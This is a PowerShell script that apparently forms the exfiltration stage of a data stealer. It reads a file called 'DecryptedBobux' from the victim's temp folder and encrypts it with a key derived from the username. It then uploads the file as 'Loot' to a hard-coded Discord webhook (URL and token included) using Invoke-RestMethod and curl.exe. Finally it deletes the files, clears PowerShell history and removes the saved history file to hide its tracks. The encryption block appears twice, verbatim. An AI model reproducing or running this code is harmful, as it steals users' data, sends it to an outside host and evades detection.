# Define file path to read
$InputFile = Join-Path $env:TEMP "$($env:USERNAME)_DecryptedBobux.txt"

# Verify that file exists
if (-not (Test-Path $InputFile)) {
    Write-Host "Error: File not found - $InputFile"
    exit
}

# Read file content as an array of lines
$Content = Get-Content -Path $InputFile

# Join lines into single plaintext string with CRLF line endings
$PlainText = $Content -join "`r`n"

# --- AES-256 ENCRYPTION SECTION ---
# Key derived from username
$KeyBytes = [System.Text.Encoding]::UTF8.GetBytes($env:USERNAME.PadRight(32,'0'))

$AES = [System.Security.Cryptography.Aes]::Create()
$AES.KeySize = 256
$AES.Key = $KeyBytes
$AES.GenerateIV()  # Random IV
$Encryptor = $AES.CreateEncryptor()

$PlainBytes = [System.Text.Encoding]::UTF8.GetBytes($PlainText)
$CipherBytes = $Encryptor.TransformFinalBlock($PlainBytes, 0, $PlainBytes.Length)

# Combine IV + ciphertext
$FinalBytes = $AES.IV + $CipherBytes

# Base64 encode
$B64Encoded = [Convert]::ToBase64String($FinalBytes)

# Save encrypted output
$OutputFile = Join-Path $env:TEMP "$($env:USERNAME)_EncryptedBobux.txt"
$B64Encoded | Out-File -FilePath $OutputFile -Encoding UTF8

$PlainText = $Content -join "`r`n"

# --- AES-256 Encryption ---
# Key derived from username
$KeyBytes = [System.Text.Encoding]::UTF8.GetBytes($env:USERNAME.PadRight(32,'0'))

$AES = [System.Security.Cryptography.Aes]::Create()
$AES.KeySize = 256
$AES.Key = $KeyBytes
$AES.GenerateIV()  # random IV
$Encryptor = $AES.CreateEncryptor()

$PlainBytes = [System.Text.Encoding]::UTF8.GetBytes($PlainText)
$CipherBytes = $Encryptor.TransformFinalBlock($PlainBytes,0,$PlainBytes.Length)

# Store IV + ciphertext together
$FinalBytes = $AES.IV + $CipherBytes

# Base64 encode
$B64Encoded = [Convert]::ToBase64String($FinalBytes)

# Save to file
$OutputFile = Join-Path $env:TEMP "$($env:USERNAME)_EncryptedBobux.txt"
$B64Encoded | Out-File -FilePath $OutputFile -Encoding UTF8

function Upload-Discord {
[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)
$hookurl = 'https://discord.com/api/webhooks/1428300873338978306/eNJfk8G59U1vpHDoO5981Y5JiAbGpOGvBMNVG96ad6c5a13UXDBOPlRCK92CpbvCp7Fl'
$Body = @{
  'Loot' = "$($env:USERNAME)_EncryptedBobux.txt"
  'content' = $text
}
if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
}
Upload-Discord -file "$env:TEMP\$($env:USERNAME)_EncryptedBobux.txt"

Remove-Item (Join-Path $env:TEMP "$($env:USERNAME)_DecryptedBobux.txt") -Force -ErrorAction SilentlyContinue
Remove-Item (Join-Path $env:TEMP "$($env:USERNAME)_EncryptedBobux.txt") -Force -ErrorAction SilentlyContinue

Clear-History
Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
